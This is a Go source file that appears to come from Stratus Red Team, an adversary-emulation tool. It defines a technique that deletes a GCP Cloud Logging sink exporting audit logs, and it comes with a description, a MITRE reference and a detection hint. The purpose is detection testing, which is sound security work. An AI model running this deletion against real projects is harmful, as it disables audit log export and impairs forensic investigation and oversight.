package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"log"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	logging "google.golang.org/api/logging/v2"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.defense-evasion.delete-logging-sink",
		FriendlyName: "Delete a GCP Log Sink",
		Description: `
Deletes a Cloud Logging sink that exports audit logs to a storage destination.
Simulates an attacker disrupting audit log export to impair forensic investigation and detection.

Warm-up:

- Create a GCS bucket
- Create a log sink exporting audit logs (<code>cloudaudit.googleapis.com</code>) to the bucket

Detonation:

- Delete the log sink

References:

- https://cloud.google.com/logging/docs/export/configure_export_v2
- https://www.trendmicro.com/cloudoneconformity/knowledge-base/gcp/CloudLogging/logging-sink.html
- https://attack.mitre.org/techniques/T1562/008/
- https://redcanary.com/threat-detection-report/trends/cloud-attacks/
`,
		Detection: `
Identify when a log sink is deleted using the GCP Admin Activity audit log event
<code>google.logging.v2.ConfigServiceV2.DeleteSink</code>.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.DefenseEvasion},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	sinkName := params["sink_name"]
	projectId := providers.GCP().GetProjectId()
	sinkPath := fmt.Sprintf("projects/%s/sinks/%s", projectId, sinkName)

	loggingService, err := logging.NewService(context.Background(), providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to instantiate Cloud Logging client: %w", err)
	}

	log.Println("Deleting log sink " + sinkPath)
	_, err = loggingService.Projects.Sinks.Delete(sinkPath).Do()
	if err != nil {
		return fmt.Errorf("failed to delete log sink %s: %w", sinkPath, err)
	}

	log.Println("Successfully deleted log sink " + sinkName)
	return nil
}
